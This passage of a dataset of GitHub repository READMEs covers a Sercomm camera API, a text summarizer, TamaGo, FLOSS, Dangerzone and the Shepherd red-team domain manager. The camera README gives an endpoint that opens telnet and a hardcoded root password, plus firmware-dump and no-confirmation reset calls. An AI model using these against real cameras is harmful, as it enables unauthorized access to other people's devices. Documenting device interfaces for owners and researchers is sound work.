Response:\\n\\n```\\n[QOS]\\nqos_enable=0\\nqos_dscp=32\\nqos_av_switch=0\\n```\\n\\nTODO!\\n\\n### MCWS???\\n* Get all ??? configuration\\n * `/adm/get_group.cgi?group=MCWS`\\n * Response:\\n\\n```\\n[MCWS]\\nurl_periodic=\\nurl_event=\\nexpire_hours=0\\n```\\n\\nTODO!\\n\\n### HTTP Events\\n* Get all HTTP POST Events configuration\\n * `/adm/get_group.cgi?group=HTTP_EVENT`\\n * Response:\\n\\n```\\n[HTTP_EVENT]\\nhttp_event_en=0\\nhttp_post_en=0\\nhttp_post_user=\\nhttp_post_pass=\\nhttp_post_url=\\n```\\n\\n**Note:** The response will *never* display your passwords.\\n\\nTODO!\\n\\n### Point-to-point protocol over Ethernet\\n* Get all PPPOE configuration\\n * `/adm/get_group.cgi?group=PPPOE`\\n * Response:\\n\\n```\\n[PPPOE]\\npppoe_enable=0\\npppoe_username=\\npppoe_password=\\npppoe_dod=0\\npppoe_idle_time=300\\npppoe_redial_time=30\\npppoe_hostname=\\npppoe_mtu_type=0\\npppoe_mtu=1492\\n```\\n\\n**Note:** The response will *never* display your passwords.\\n\\n\\n### Bonjour\\n* Get all [ZeroConf Networking](https://en.wikipedia.org/wiki/Bonjour_%28software%29) configuration\\n * `/adm/get_group.cgi?group=`\\n * Response:\\n\\n```\\n[BONJOUR]\\nbonjour_name=RC8230-92fff7\\nbonjour_mode=0\\n```\\n\\n### SD Card\\n\\nSome cameras have a slot for a MicroSD Card, onto which images and videos can be saved.\\n\\n* Get SD Card configuration\\n * `/adm/get_group.cgi?group=SDCARD`\\n * Response:\\n\\n```\\n[SDCARD]\\nsdcard_rec_enable=0\\nsdcard_rec_event_enable=0\\nsdcard_rec_audio_enable=0\\nsdcard_rec_file_ctrl=1\\nsdcard_rec_file_size=10\\nsdcard_rec_disk_ctrl=0\\nsdcard_rec_duration=60\\nsdcard_rec_stream_id=1\\nsdcard_rec_filename_prefix=\\nsdcard_rec_event_prefix=\\nsdcard_rec_schedule=\\nsdcard_rec_schedule1=\\nsdcard_rec_schedule2=\\nsdcard_rec_schedule3=\\nsdcard_rec_schedule4=\\nsdcard_rec_schedule5=\\nsdcard_rec_schedule6=\\nsdcard_rec_schedule7=\\nsdcard_rec_schedule8=\\nsdcard_rec_schedule9=\\nsdcard_rec_schedule10=\\n```\\n\\nTODO!\\n\\n### Pan/Tilt/Zoon\\n* Get all PTZ configuration\\n * `/adm/get_group.cgi?group=PTZ`\\n * Response:\\n\\n```\\n[PTZ]\\nPtzMode=1\\nPtzMdMutex=2\\nPreset1Name=\\nPreset2Name=\\nPreset3Name=\\nPreset4Name=\\nPreset5Name=\\nPreset6Name=\\nPreset7Name=\\nPreset8Name=\\nPreset9Name=\\nPreset1Position=\\nPreset2Position=\\nPreset3Position=\\nPreset4Position=\\nPreset5Position=\\nPreset6Position=\\nPreset7Position=\\nPreset8Position=\\nPreset9Position=\\nPatrol1Position=\\nPredefineHome=0,0\\nPatrolInterval=\\nPatrolStyle=0\\n```\\n\\nTODO!\\n\\n## Firmware\\n\\n### Firmware Download\\n\\n* Download the camera's firmware\\n * `/adm/flash_dumper.cgi`\\n * Response is a file called `fw.bin`\\n\\n### Firmware Upload\\n\\nIt is possible to upgrade the firmware via the API. I would **strongly** recommend doing this via the GUI to ensure that the upgrade is accepted.\\n\\n*Never* upload the firmware from one model of camera to a different model.\\n\\n* Upgrade the camera's firmware using HTTP **POST**\\n * `/adm/upgrade.cgi`\\n * The firmware must be uploaded in base64\\n * Wait at least 5 minutes to ensure that the firmware has been successfully flashed.\\n \\n## Reboot and Reset\\n\\nThese controls allow you to reboot/restart the camera. You can also reset it to its system defaults.\\n\\n**Note:** There is *no confirmation prompt!* Once you issue these commands, they will execute immediately.\\n\\n* Reboot the camera\\n * `/adm/reboot.cgi`\\n * Response `OK`\\n * Camera will immediately restart.\\n\\n* Factory reset the camera\\n * `/adm/reset_to_default.cgi`\\n * Response `OK`\\n * Camera will immediately factory reset.\\n \\n## Software Licenses\\n\\nThe cameras make extensive use of Open Source Software. You can see the software versions and Open Source Licensing information.\\n\\n* View software licenses\\n * `/adm/Licenses.txt`\\n * Response: a text file containing the information \\n \\n## Time Zones\\n\\nThe cameras use a somewhat baroque way of representing Timezones. Each zone has a number. Timezones with daylight savings are marked with an asterisk *. \\n\\n- `0` (GMT-12:00) International Date Line West \\n- `1` (GMT-11:00) Midway\\n- `2` (GMT-10:00) Hawaii \\n- `3` *(GMT-09:00) Alaska\\n- `4` *(GMT-08:00) Pacific Time (US & Canada), Tijuana\\n- `5` (GMT-07:00) Arizona\\n- `6` *(GMT-07:00) Chihuahua, La Paz, Mazatlan\\n- `7` *(GMT-07:00) Mountain Time (US & Canada)\\n- `8` (GMT-06:00) Central America\\n- `9` *(GMT-06:00) Central Time (US & Canada)\\n- `10` *(GMT-06:00) Guadalajara, Mexico City, Monterrey\\n- `11` (GMT-06:00) Saskatchewan \\n- `12` (GMT-05:00) Bogota, Lima, Quito\\n- `13` *(GMT-05:00) Eastern Time (US & Canada) \\n- `14` (GMT-05:00) Indiana (East)\\n- `15` *(GMT-04:00) Atlantic Time (Canada) \\n- `16` (GMT-04:00) La Paz \\n- `17` *(GMT-04:00) Santiago\\n- `18` *(GMT-03:30) Newfoundland\\n- `19` *(GMT-03:00) Brasilia\\n- `20` (GMT-03:00) Buenos Aires, Georgetown\\n- `21` *(GMT-03:00) Greenland \\n- `22` *(GMT-02:00) Mid-Atlantic\\n- `23` *(GMT-01:00) Azores\\n- `24` (GMT-01:00) Cape Verde Is.\\n- `25` (GMT) Casablanca, Monrovia\\n- `26` *(GMT) Greenwich Mean Time: Dublin, Edinburgh, Lisbon, London\\n- `27` *(GMT+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna\\n- `28` *(GMT+01:00) Belgrade, Bratislava, Budapest, Ljubljana, Prague\\n- `29` *(GMT+01:00) Brussels, Copenhagen, Madrid, Paris\\n- `30` *(GMT+01:00) Sarajevo, Skopje, Warsaw, Zagreb \\n- `31` (GMT+01:00) West Central Africa \\n- `32` *(GMT+02:00) Athens, Istanbul, Minsk \\n- `33` *(GMT+02:00) Bucharest \\n- `34` *(GMT+02:00) Cairo \\n- `35` (GMT+02:00) Harare, Pretoria \\n- `36` *(GMT+02:00) Helsinki, Kyiv, Riga, Sofia, Tallinn, Vilnius \\n- `37` (GMT+02:00) Jerusalem \\n- `38` *(GMT+03:00) Baghdad \\n- `39` (GMT+03:00) Kuwait, Riyadh \\n- `40` *(GMT+03:00) Moscow, St. Petersburg, Volgograd \\n- `41` (GMT+03:00) Nairobi \\n- `42` *(GMT+03:30) Tehran \\n- `43` (GMT+04:00) Abu Dhabi, Muscat \\n- `44` *(GMT+04:00) Baku, Tbilisi, Yerevan \\n- `45` (GMT+04:30) Kabul \\n- `46` *(GMT+05:00) Ekaterinburg \\n- `47` (GMT+05:00) Islamabad, Karachi, Tashkent \\n- `48` (GMT+05:30) Chennai, Kolkata, Mumbai, New Delhi \\n- `49` (GMT+05:45) Kathmandu \\n- `50` *(GMT+06:00) Almaty, Novosibirsk \\n- `51` (GMT+06:00) Astana, Dhaka \\n- `52` (GMT+06:00) Sri Jayawardenepura \\n- `53` (GMT+06:30) Rangoon \\n- `54` (GMT+07:00) Bangkok, Hanoi, Jakarta \\n- `55` *(GMT+07:00) Krasnoyarsk \\n- `56` (GMT+08:00) Beijing, Chongqing, Hong Kong, Urumqi \\n- `57` *(GMT+08:00) Irkutsk, Ulaan Bataar \\n- `58` (GMT+08:00) Kuala Lumpur, Singapore \\n- `59` (GMT+08:00) Perth \\n- `60` (GMT+08:00) Taipei \\n- `61` (GMT+09:00) Osaka, Sapporo, Tokyo \\n- `62` (GMT+09:00) Seoul \\n- `63` *(GMT+09:00) Yakutsk \\n- `64` *(GMT+09:30) Adelaide \\n- `65` (GMT+09:30) Darwin \\n- `66` (GMT+10:00) Brisbane \\n- `67` *(GMT+10:00) Canberra, Melbourne, Sydney \\n- `68` (GMT+10:00) Guam, Port Moresby \\n- `69` *(GMT+10:00) Hobart \\n- `70` *(GMT+10:00) Vladivostok \\n- `71` (GMT+11:00) Magadan, Solomon Is., New Caledonia \\n- `72` *(GMT+12:00) Auckland, Wellington \\n- `73` (GMT+12:00) Fiji, Kamchatka, Marshall Is. \\n- `74` (GMT+13:00) Nuku'alofa \\n- `75` (GMT-04:30) Caracas\\n\\n## Telnet\\n\\nSome cameras will allow Telnet access.\\n\\n* Activate Telnet\\n * ` /adm/file.cgi?todo=inject_telnetd`\\n * Response: if successful, you will see `Open Telnet Daemon successfully!`\\n\\n* (confirmed to work on RC8025b-ADT)\\n- username: `root`\\n- password: `Aq0+0009`\\n\\nList of available telnet commands:\\n```\\n- .\\n- :\\n- [\\n- [[\\n- alias\\n- bg\\n- break\\n- cd\\n- chdir\\n- continue\\n- echo\\n- eval\\n- exec\\n- exit\\n- export\\n- false\\n- fg\\n- hash\\n- help\\n- jobs\\n- kill\\n- let\\n- local\\n- printf\\n- pwd\\n- read\\n- readonly\\n- return\\n- set\\n- shift\\n- source\\n- test\\n- times\\n- trap\\n- true\\n- type\\n- ulimit\\n- umask\\n- unalias\\n- unset\\n- wait\\n```\\n\\n## TODO!\\nIf you can help with these missing piece of functionality, I would be most grateful.\\n\\n### Sending Audio\\nWith the speakers enabled, it should be possible to POST an audio file to the cameras, either in G.726, or G.711 (a-law or u-law). I've not been able to get this working. [See further discussion](http://stackoverflow.com/questions/19686996/post-audio-to-a-network-camera).\\n\\n#### Missing Functionality\\nNot all API calls are documented. Not all which are in the official documentation are valid. Fill in the gaps :-)\\n\"", "topics": ["api", "camera"], "writeup": "", "ignoredescription": false, "id": 24, "full_name": "edent/Sercomm-API", "url": "https://github.com/edent/Sercomm-API", "topic_string": "api camera"},
{"tags": [], "owner": "edubey", "description": "Understand Text Summarization and create your own summarizer in python", "name": "text-summarizer", "topics_string": "", "language": "Python", "readme": "\"### Understand Text Summarization and create your own summarizer in python\\n\\nSummarization can be defined as a task of producing a concise and fluent summary while preserving key information and overall meaning.\\n\\nImpact\\nSummarization systems often have additional evidence they can utilize in order to specify the most important topics of document(s). For example, when summarizing blogs, there are discussions or comments coming after the blog post that are good sources of information to determine which parts of the blog are critical and interesting.\\n\\nIn scientific paper summarization, there is a considerable amount of information such as cited papers and conference information which can be leveraged to identify important sentences in the original paper.\\n\\nComplete article with code and results can be found on [Medium](https://towardsdatascience.com/understand-text-summarization-and-create-your-own-summarizer-in-python-b26a9f09fc70)\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 25, "full_name": "edubey/text-summarizer", "url": "https://github.com/edubey/text-summarizer", "topic_string": ""},
{"tags": [], "owner": "f-secure-foundry", "description": "TamaGo - bare metal Go for ARM SoCs", "name": "tamago", "topics_string": "", "language": "Go", "readme": "\"TamaGo - bare metal Go for ARM SoCs\\n===================================\\n\\ntamago | https://github.com/f-secure-foundry/tamago \\n\\nCopyright (c) F-Secure Corporation \\nhttps://foundry.f-secure.com\\n\\n![TamaGo gopher](https://github.com/f-secure-foundry/tamago/wiki/images/tamago.svg?sanitize=true)\\n\\nAuthors\\n=======\\n\\nAndrea Barisani \\nandrea.barisani@f-secure.com | andrea@inversepath.com \\n\\nAndrej Rosano \\nandrej.rosano@f-secure.com | andrej@inversepath.com \\n\\nIntroduction\\n============\\n\\nTamaGo is a framework that enables compilation and execution of unencumbered Go\\napplications on bare metal ARM System-on-Chip (SoC) components.\\n\\nThe projects spawns from the desire of reducing the attack surface of embedded\\nsystems firmware by removing any runtime dependency on C code and Operating\\nSystems.\\n\\nThe TamaGo framework consists of the following components:\\n\\n - A modified [Go distribution](https://github.com/f-secure-foundry/tamago-go)\\n which extends `GOOS` support to the `tamago` target, allowing bare metal\\n execution.\\n\\n - Go packages for SoC driver support.\\n\\n - Go packages for board support.\\n\\nThe modifications are meant to be minimal for both the Go distribution (< ~4000\\nLOC changed) and the target application (one import required), with a clean\\nseparation from other architectures.\\n\\nStrong emphasis is placed on code re-use from existing architectures already\\nincluded within the standard Go runtime, see\\n[Internals](https://github.com/f-secure-foundry/tamago/wiki/Internals).\\n\\nBoth aspects are motivated by the desire of providing a framework that allows\\nsecure Go firmware development on embedded systems.\\n\\nCurrent release level\\n=====================\\n\\nThe current release for the [TamaGo modified Go distribution](https://github.com/f-secure-foundry/tamago-go) is\\n[tamago1.15.2](https://github.com/f-secure-foundry/tamago-go/tree/tamago1.15.2),\\nwhich [adds](https://github.com/golang/go/compare/go1.15.2...f-secure-foundry:tamago1.15.2)\\n`GOOS=tamago` support to go1.15.2.\\n\\nBinary releases for amd64 and armv7l Linux hosts [are available](https://github.com/f-secure-foundry/tamago-go/releases/latest).\\n\\nDocumentation\\n=============\\n\\nThe main documentation can be found on the\\n[project wiki](https://github.com/f-secure-foundry/tamago/wiki).\\n\\nThe package API documentation can be found on\\n[pkg.go.dev](https://pkg.go.dev/github.com/f-secure-foundry/tamago).\\n\\nSupported hardware\\n==================\\n\\nThe following table summarizes currently supported SoCs and boards.\\n\\n| SoC | Board | SoC package | Board package |\\n|---------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------|\\n| NXP i.MX6ULL | [USB armory Mk II](https://github.com/f-secure-foundry/usbarmory/wiki) | [imx6](https://github.com/f-secure-foundry/tamago/tree/master/soc/imx6) | [usbarmory/mark-two](https://github.com/f-secure-foundry/tamago/tree/master/board/f-secure/usbarmory) |\\n| NXP i.MX6ULL | [MCIMX6ULL-EVK](https://www.nxp.com/design/development-boards/i-mx-evaluation-and-development-boards/evaluation-kit-for-the-i-mx-6ull-and-6ulz-applications-processor:MCIMX6ULL-EVK) | [imx6](https://github.com/f-secure-foundry/tamago/tree/master/soc/imx6) | [mx6ullevk](https://github.com/f-secure-foundry/tamago/tree/master/board/nxp/mx6ullevk) |\\n| BCM2835 | [Raspberry Pi Zero](https://www.raspberrypi.org/products/raspberry-pi-zero) | [bcm2835](https://github.com/f-secure-foundry/tamago/tree/master/soc/bcm2835) | [pi/pizero](https://github.com/f-secure-foundry/tamago/tree/master/board/raspberrypi) |\\n| BCM2836 | [Raspberry Pi 2](https://www.raspberrypi.org/products/raspberry-pi-2-model-b) | [bcm2835](https://github.com/f-secure-foundry/tamago/tree/master/soc/bcm2835) | [pi/pi2](https://github.com/f-secure-foundry/tamago/tree/master/board/raspberrypi) |\\n\\nCompiling\\n=========\\n\\nGo applications are simply required to import, the relevant board package to\\nensure that hardware initialization and runtime support takes place:\\n\\n```golang\\nimport (\\n\\t// Example for USB armory Mk II\\n\\t_ \\\"github.com/f-secure-foundry/tamago/board/f-secure/usbarmory/mark-two\\\"\\n)\\n```\\n\\nBuild the [TamaGo compiler](https://github.com/f-secure-foundry/tamago-go)\\n(or use the [latest binary release](https://github.com/f-secure-foundry/tamago-go/releases/latest)):\\n\\n```\\ngit clone https://github.com/f-secure-foundry/tamago-go -b latest\\ncd tamago-go/src && ./all.bash\\ncd ../bin && export TAMAGO=`pwd`/go\\n```\\n\\nGo applications can be compiled with the compiler built in the previous step,\\nwith the addition of a few flags/variables:\\n\\n```\\n# Example for USB armory Mk II\\nGO_EXTLINK_ENABLED=0 CGO_ENABLED=0 GOOS=tamago GOARM=7 GOARCH=arm \\\\\\n ${TAMAGO} build -ldflags \\\"-T 0x80010000 -E _rt0_arm_tamago -R 0x1000\\\"\\n```\\n\\nSee the respective board package README file for compilation information for\\neach specific target.\\n\\nExecuting and debugging\\n=======================\\n\\nSee the respective board package README file for execution and debugging\\ninformation for each specific target (real or emulated).\\n\\nThe [example application](https://github.com/f-secure-foundry/tamago-example)\\nprovides sample driver usage and instructions for native as well as emulated\\nexecution.\\n\\nLicense\\n=======\\n\\ntamago | https://github.com/f-secure-foundry/tamago \\nCopyright (c) F-Secure Corporation\\n\\nThis program is free software: you can redistribute it and/or modify it under\\nthe terms of the GNU General Public License as published by the Free Software\\nFoundation under version 3 of the License.\\n\\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY\\nWARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A\\nPARTICULAR PURPOSE. See the GNU General Public License for more details.\\n\\nSee accompanying LICENSE file for full details.\\n\\nThe TamaGo logo is adapted from the Go gopher designed by Renee French and\\nlicensed under the Creative Commons 3.0 Attributions license. Go Gopher vector\\nillustration by Hugo Arganda.\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 26, "full_name": "f-secure-foundry/tamago", "url": "https://github.com/f-secure-foundry/tamago", "topic_string": ""},
{"tags": [], "owner": "fireeye", "description": "FireEye Labs Obfuscated String Solver - Automatically extract obfuscated strings from malware.", "name": "flare-floss", "topics_string": "", "language": "Python", "readme": "\"[![Appveyor Build Status](https://ci.appveyor.com/api/projects/status/github/fireeye/flare-floss?branch=master&svg=true)](https://ci.appveyor.com/project/williballenthin/flare-floss)\\n[![Travis Build Status](https://travis-ci.org/fireeye/flare-floss.svg?branch=master)](https://travis-ci.org/fireeye/flare-floss)\\n\\n\\n<img src=\\\"resources/logo.png?raw=true \\\" width=\\\"350\\\"/>\\n\\n# FireEye Labs Obfuscated String Solver\\n\\nRather than heavily protecting backdoors with hardcore packers, many\\nmalware authors evade heuristic detections by obfuscating only key\\nportions of an executable. Often, these portions are strings and resources\\nused to configure domains, files, and other artifacts of an infection.\\nThese key features will not show up as plaintext in output of the `strings.exe` utility\\nthat we commonly use during basic static analysis.\\n\\nThe FireEye Labs Obfuscated String Solver (FLOSS) uses advanced\\nstatic analysis techniques to automatically deobfuscate strings from\\nmalware binaries. You can use it just like `strings.exe` to enhance\\nbasic static analysis of unknown binaries.\\n\\nPlease review the theory behind FLOSS [here](doc/theory.md).\\n\\n\\n## Quick Run\\nTo try FLOSS right away, download a standalone executable file from the releases page:\\nhttps://github.com/fireeye/flare-floss/releases\\n\\nFor a detailed description of *installing* FLOSS, review the documention\\n [here](doc/installation.md).\\n\\nStandalone nightly builds:\\n - Windows 64bit: [here](http://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/appveyor/dist/floss64.exe) \\n - Windows 32bit: [here](http://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/appveyor/dist/floss32.exe)\\n - Linux: [here](https://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/travis/linux/dist/floss)\\n - OSX: [here](https://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/travis/osx/dist/floss)\\n\\n\\n## Usage\\nExtract obfuscated strings from a malware binary:\\n\\n $ floss /path/to/malware/binary\\n\\nDisplay the help/usage screen to see all available switches.\\n\\n $ ./floss -h\\n\\nFor a detailed description of *using* FLOSS, review the documention\\n [here](doc/usage.md).\\n\\nFor a detailed description of *testing* FLOSS, review the documention\\n [here](doc/test.md).\\n\\n## Sample Output\\n\\n```\\n$ floss malware.bin\\nFLOSS static ASCII strings\\n!This program cannot be run in DOS mode.\\n_YY\\nRichYY\\nMdfQ\\n.text\\n`.rdata\\n@.data\\n.idata\\n.didat\\n.reloc\\nU F\\n?;}\\nA@;E\\n_^[\\nHttHt-H\\n'9U\\nWS2_32.dll\\nFreeLibrary\\nGetProcAddress\\nLoadLibraryA\\nGetModuleHandleA\\nGetVersionExA\\nMultiByteToWideChar\\nWideCharToMultiByte\\nSleep\\nGetLastError\\nDeleteFileA\\nWriteFile\\n[..snip...]\\n\\nFLOSS static UTF-16 strings\\n,%d\\n\\nFLOSS decoded 4 strings\\nWinSta0\\\\Default\\nSoftware\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Internet Settings\\nProxyEnable\\nProxyServer\\n\\nFLOSS extracted 81 stack strings\\nWinSta0\\\\Default\\n'%s' executed.\\nERR '%s' error[%d].\\nSoftware\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Internet Settings\\nProxyEnable\\nProxyServer\\nwininet.dll\\nInternetOpenA\\n0\\\\A4\\nInternetSetOptionA\\nInternetConnectA\\nInternetQueryOptionA\\nMozilla/4.0 (compatible; MSIE 7.0; Win32)\\n-ERR\\nFILE(%s) wrote(%d).\\nInvalid ojbect.\\nSetFilepoint error[%d].\\nb64_ntop error[%d].\\nGetFileSize error[%d].\\nCreates file error[%d].\\nKCeID5Y/96QTJc1pzi0ZhEBqVG83OnXaL+oxsRdymHS4bFgl7UrWfP2v=wtjNukM\\n[..snip...]\\n```\\n\"", "topics": ["fireeye-flare", "deobfuscation", "malware", "strings", "reverse-engineering"], "writeup": "", "ignoredescription": false, "id": 27, "full_name": "fireeye/flare-floss", "url": "https://github.com/fireeye/flare-floss", "topic_string": "fireeye-flare deobfuscation malware strings reverse-engineering"},
{"tags": [], "owner": "firstlookmedia", "description": "Take potentially dangerous PDFs, office documents, or images and convert them to a safe PDF", "name": "dangerzone", "topics_string": "", "language": "Python", "readme": "\"# dangerzone\\n\\nTake potentially dangerous PDFs, office documents, or images and convert them to a safe PDF.\\n\\n![Screenshot](./assets/screenshot.png)\\n\\nDangerzone works like this: You give it a document that you don't know if you can trust (for example, an email attachment). Inside of a sandbox, dangerzone converts the document to a PDF (if it isn't already one), and then converts the PDF into raw pixel data: a huge list of of RGB color values for each page. Then, in a separate sandbox, dangerzone takes this pixel data and converts it back into a PDF.\\n\\n_Read more about dangerzone in the blog post [Dangerzone: Working With Suspicious Documents Without Getting Hacked](https://tech.firstlook.media/dangerzone-working-with-suspicious-documents-without-getting-hacked)._\\n\\n## Getting started\\n\\n- Download [dangerzone 0.1.1 for Mac](https://github.com/firstlookmedia/dangerzone/releases/download/v0.1.1/Dangerzone.0.1.1.dmg)\\n- Download [dangerzone 0.1.1 for Windows](https://github.com/firstlookmedia/dangerzone/releases/download/v0.1.1/Dangerzone.0.1.1.msi)\\n- See [installing dangerzone](https://github.com/firstlookmedia/dangerzone/wiki/Installing-Dangerzone) on the wiki for Linux repositories\\n\\nYou can also install dangerzone for Mac using [Homebrew](https://brew.sh/): `brew cask install dangerzone`\\n\\n## Some features\\n\\n- Sandboxes don't have network access, so if a malicious document can compromise one, it can't phone home\\n- Dangerzone can optionally OCR the safe PDFs it creates, so it will have a text layer again\\n- Dangerzone compresses the safe PDF to reduce file size\\n- After converting, dangerzone lets you open the safe PDF in the PDF viewer of your choice, which allows you to open PDFs and office docs in dangerzone by default so you never accidentally open a dangerous document\\n\\nDangerzone can convert these types of document into safe PDFs:\\n\\n- PDF (`.pdf`)\\n- Microsoft Word (`.docx`, `.doc`)\\n- Microsoft Excel (`.xlsx`, `.xls`)\\n- Microsoft PowerPoint (`.pptx`, `.ppt`)\\n- ODF Text (`.odt`)\\n- ODF Spreadsheet (`.ods`)\\n- ODF Presentation (`.odp`)\\n- ODF Graphics (`.odg`)\\n- Jpeg (`.jpg`, `.jpeg`)\\n- GIF (`.gif`)\\n- PNG (`.png`)\\n- TIFF (`.tif`, `.tiff`)\\n\\nDangerzone was inspired by [Qubes trusted PDF](https://blog.invisiblethings.org/2013/02/21/converting-untrusted-pdfs-into-trusted.html), but it works in non-Qubes operating systems. It uses containers as sandboxes instead of virtual machines (using Docker for macOS, Windows, and Debian/Ubuntu, and [podman](https://podman.io/) for Fedora).\\n\\nSet up a development environment by following [these instructions](/BUILD.md).\\n\\nThe git repository for the container is called [dangerzone-converter](https://github.com/firstlookmedia/dangerzone-converter).\"", "topics": ["docker"], "writeup": "Dangerzone works like this: You give it a document that you don't know if you can trust (for example, an email attachment). Inside of a sandbox, dangerzone converts the document to a PDF (if it isn't already one), and then converts the PDF into raw pixel data: a huge list of of RGB color values for each page. Then, in a separate sandbox, dangerzone takes this pixel data and converts it back into a PDF.\n", "ignoredescription": false, "id": 28, "full_name": "firstlookmedia/dangerzone", "url": "https://github.com/firstlookmedia/dangerzone", "topic_string": "docker"},
{"tags": [], "owner": "GhostManager", "description": "A Django application to help red team operators manage a library of domain names", "name": "Shepherd", "topics_string": "", "language": "Python", "readme": "\"# Shepherd\\n\\n[![Python Version](https://img.shields.io/badge/Python-3.7-brightgreen.svg)](.) [![License](https://img.shields.io/badge/License-BSD3-darkred.svg)](.)\\n\\n![Shepherd](https://github.com/GhostManager/Shepherd/raw/master/Shepherd.jpg)\\n\\nShepherd is a Django application written in Python 3.7 and is designed to be used by a team of operators. It keeps track of domain names and each domain's current DNS settings, categorization, project history, and status. The tracked statuses include which domains are: ready to be used, burned/retired, or in use, and which team member checked out each of the active domains.\\n\\nMore information is available here: https://medium.com/@cmaddy/being-a-good-domain-shepherd-part-2-5e8597c3fe63\\n\\n## Installation\\n\\nShepherd requires Redis server and Python 3.7. Install these before proceeding. The exact steps will depend on your operating system, but should be as simple as using an `apt install` or `brew install` command.\\n\\n### Installing Libraries\\n\\nAll of Shepherd's Python/Django dependencies are documented in the Pipfile. It is easiest to setup and use a virtual environment using `pipenv`. This is the best option for managing the required libraries and to avoid Python installations getting mixed-up.\\n\\nDo this:\\n\\n1. Run: `pip3 install --user pipenv` or `python3 -m pip install --user pipenv`\\n2. Run: `git clone https://github.com/GhostManager/Shepherd.git`\\n3. Run: cd Shepherd && pipenv install\\n4. Start using Shepherd by running: pipenv shell\\n\\n### Adjusting Settings.py\\n\\nOnce Django and the other Python libraries are installed, open Shepherd's settings.py file and direct your attention to the `SECRET_KEY` and `DEBUG` variables. You can set `DEBUG` to `True` if you want to test Shepherd or make some changes. It is a good idea to set this to `False` in production, even though Shepherd _should_ only be used as an internal resource.\\n\\nThe `SECRET_KEY` variable is set to `changeme`. Feel free to generate something and drop it in or use an environment variable. It's usually something like `cg#p$g+j9tax!#a3cup@1$8obt2_+&k3q+pmu)5%asj6yjpkag`.\\n\\n### Additional Settings\\n\\n#### API Configuration\\n\\nSettings.py also stores API information for a few functions. One of Shepherd's core features is updating domain \\\"health\\\" data (more on that below). This uses web requests and part of it uses the VirusTotal API. If you do not have one, get a free API key from VirusTotal. Once you have your key add it to the `DOMAINCHECK_CONFIG` settings.\\n\\nIf you have a paid VirusTotal license and are not subject to the 4 requests per minute limit you can play with the `sleep_time` setting. A 20 second `sleep_time` is still recommended to avoid spewing web requests so fast that your IP address gets blocked with reCAPTCHAs, but you can try reducing it.\\n\\n#### Slack Configuration\\n\\nThere is also a `SLACK_CONFIG` settings dictionary. If you have, or can get, a Slack Incoming Webhook you can configure that here to receive some messages when tasks are completed or domains are burned.\\n\\nYou can set a username and emoji for the bot. Emojis must be set using Slack syntax like `:sheep:`. The username can be anything you could use for a Slack username. The emoji will appear as the bot's avatar in channels.\\n\\nThe alert target is the message target. You can set this to a blank string, e.g. `''`, but it's mostly useful for targeting users, aliases, or @here/@channel. They must be written as `<!here>`, `<!channel>`, or `<@username>` for them to work as actual notification keywords.\\n\\nFinally, set the target channel. This might be your `#general` or some other channel. This is the global value that will be used for all messages unless another value is supplied. Currently only the global value from settings.py is used but in the future there will be messages sent for specific projects and events. For example, when a domain is checked-out for use the user can specify a Slack channel to use for notifications and a future version of Shepherd, currently in the works, will use that channel to send project_related notifications to the provided the channel.\\n\\nIf you do not want to use Slack change `enable_slack` to `False`.\\n\\nOther notification options are coming soon. Email and services such as Pushover are being considered.\\n\\n### Database Setup\\n\\nNext, the database tables must be migrated. This configures all of Shepherd's database models from the code in models.py to actual tables:\\n\\nTo setup the database run: `python3 manage.py migrate`\\n\\nAssuming that completed successfully, you need to pre-populate a few of Shepherd's database models with some data. These are just some basic domain statuses and project types. You can add your own as desired later.\\n\\nTo initiate settings run: `python3 manage.py loaddata catalog/fixtures/initial_values.json`\\n\\n### Start Django\\n\\nA super user must now be created to access the admin panel and create new users and groups. This is the administrator of Shepherd, so set a strong password and document it in a password vault somewhere.\\n\\nTo create a superuser run: `python manage.py createsuperuser`\\n\\nFinally, try starting the server and accessing the admin panel.\\n\\nTo start the server run: `python3 manage.py runserver`\\n\\nVisit SERVER_IP:8000/admin to view the admin panel and login using the superuser.\\n\\n### Creating New Users\\n\\nCreate your users using the admin panel. Filling out a complete profile is recommended.\\n\\nIn cases where Shepherd records a user action the usernames are used rather than first or last names, but Shepherd does display the user's full name in the corner if it is available. Also, usernames are weirdly case sensitive, so all lowercase is recommended to avoid confusion later.\\n\\nEmail addresses are not important at the present time, but this will change. Shepherd will use email addresses for password recovery, but the email server is not baked into Shepherd right now. Emails will just appear in the terminal and that is where the user or an administrator can get their password reset link.\\n\\nIn the future, email addresses will be displayed as a means of contacting the operator using a particular domain for domain and project questions. Email may also ne used to send notifications.\\n\\n### Creating New Groups\\n\\nGroups are a good way to organize user permissions. Shepherd will make a couple of functions available to a \\\"Senior Operators\\\" group, including editing a domain's information. To use this functionality create two groups named \\\"Operators\\\" and \\\"Senior Operators\\\" in the admin panel.\\n\\nOnly mark users as \\\"Staff\\\" if you want them to be able to access the Django admin panel. It is better to leave the admin panel alone for day-to-day work and it should not be required except to fix a problem or directly edit the database for some reason, so users do not require this access.\\n\\n### Start Django Q and Redis\\n\\nOnce you are ready to actually use Shepherd start your Redis server. You also need to start Django Q's `qcluster` which will need to be done using another terminal window with manage.py, just like starting the server.\\n\\nRun this: `python3 manage.py qcluster`\\n\\nIf Redis is running on a different server, you changed the port, or made some other modification, you will need to update the Redis configuration in settings.py. You could also switch to a different broker if you already have some other broker setup and would prefer to use it for Shepherd. Check Django Q's documentation to make the changes in settings.py to switch to Rabbit MQ, Amazon SQS, or whatever else you might be using.\\n\\n### Schedule Tasks\\n\\nVisit the Django Q database from the admin panel and check the Scheduled tasks. You may wish to create a scheduled task to automatically release domains at the end of a project. Shepherd has a task for this, `tasks.release_domains`, which you can schedule whenever you please, like every morning at 01:00.\\n\\n## Notes on Health\\n\\nShepherd grades a domain's health as Healthy or Burned. Health is reported as an overall health grade 